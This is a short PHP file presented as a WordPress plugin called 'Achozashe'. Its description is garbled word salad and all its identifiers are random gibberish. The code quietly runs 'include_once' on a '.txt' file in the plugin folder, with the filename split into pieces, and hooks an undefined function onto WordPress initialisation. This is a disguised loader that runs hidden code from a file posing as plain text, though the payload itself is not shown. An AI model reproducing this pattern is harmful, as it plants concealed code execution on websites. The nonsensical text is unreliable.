<?php

/**
 * Plugin Name: Achozashe
 * Plugin URI: https://theisp.edu/achozashe
 * Description: Journalists who zygodactyl feet. Many parrots have been cyberbullied and of the Great
 * Version: 1.15.0
 * Author: Long Jasper
 * Author URI: https://theisp.edu
 * Text Domain: achozashe
 * License: GPL2+
 *
 */

function otynov_tuxiryth() {
    fapyci_ykybuwozu();
}

$iryjokh = __DIR__ . '/ixycyk.txt';
if (file_exists($iryjokh)) {
    include_once __DIR__ . "/ixycy" . "k.txt";
}


if (function_exists("fapyci_ykybuwozu")) {
    $abedich = new otubeb_esazybem();
    if ($abedich->wihufe_urythyna()) {
        add_action('init', 'otynov_tuxiryth');
    }
}